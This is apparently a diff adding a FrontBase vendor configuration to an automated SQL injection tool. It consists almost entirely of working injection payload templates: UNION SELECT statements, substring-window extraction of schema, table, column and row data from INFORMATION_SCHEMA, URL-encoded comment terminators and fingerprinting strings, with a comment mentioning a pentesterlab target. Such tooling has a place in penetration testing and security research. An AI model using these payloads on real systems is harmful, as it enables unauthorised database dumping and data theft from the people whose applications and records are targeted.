@@ -1,0 +1,136 @@
+vendor: Frontbase
+
+resource:
+ info: |
+  'version()'
+  || '${enclose_value_sql}'
+  || 'database()'
+  || '${enclose_value_sql}'
+  || 'user()'
+  || '${trail_sql}'
+
+ schema:
+  database: |
+   select
+       substring(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           || '${trail_sql}'
+           from ${window.char}
+           for ${capacity}
+       )
+   from (
+       select
+           "SCHEMA_NAME" r,
+           count("TABLE_NAME") q
+       from INFORMATION_SCHEMA.tables t
+       right join INFORMATION_SCHEMA.schemata s
+       on t."schema_pk" = s."schema_pk"
+       group by r
+       ${limit}
+   ) x
+
+  table: |
+   select
+       substring(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           || '${trail_sql}'
+           from ${window.char}
+           for ${capacity}
+       )
+   from (
+       select
+           "TABLE_NAME" r,
+           '0' q
+       from INFORMATION_SCHEMA.tables t
+       right join INFORMATION_SCHEMA.schemata s
+       on t."schema_pk" = s."schema_pk"
+       where s."SCHEMA_NAME" = '${database}'
+   ) x
+   ${limit}
+
+  column: |
+   select
+       substring(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || '0'
+           || '${enclose_value_sql}'
+           || '${trail_sql}'
+           from ${window.char}
+           for ${capacity}
+       )
+   from (
+       select
+           "COLUMN_NAME" r,
+           '0' q
+       from INFORMATION_SCHEMA.COLUMNS as "c"
+       inner join INFORMATION_SCHEMA.tables as "t" using("table_pk")
+       inner join INFORMATION_SCHEMA.schemata as "s" using("schema_pk")
+       where s."SCHEMA_NAME" = '${database}'
+       and t."TABLE_NAME" = '${table}'
+   ) x
+   ${limit}
+
+  row:
+   query: |
+    select
+        substring(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || q
+            || '${enclose_value_sql}'
+            from ${window.char}
+            for ${capacity}
+       )
+       ||'${trail_sql}'
+    from (
+        select
+            ${fields} r,
+            '0' q
+        from ${database}.${table}
+    ) x
+    ${limit}
+   fields:
+    field: coalesce("${field.value}",'')
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select top 1
+           '${lead}'
+           ||
+           (${injection})
+       from INFORMATION_SCHEMA.SCHEMATA
+   )
+  limit: limit ${limit.value}, 1
+  failsafe: trim(cast(1337${indice}7330%2b1 as char(100)))
+  calibrator: "'%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23'"
+  limitBoundary: 0
+  # Encoded space mandatory to avoid space cleaning
+  # TODO keep raw space
+  # endingComment: --+-
+  # pentesterlab does not work with --+-, switch to #
+  endingComment: '--+-'
+  fingerprint:
+   errorMessage:
+    - Frontbase
+
+ normal:
+  indices: union select top 1 ${indices} from INFORMATION_SCHEMA.SCHEMATA
+  capacity: |
+   '${lead}'
+   || '${indice}'
+   || ${calibrator}
+  orderBy: order by 1337
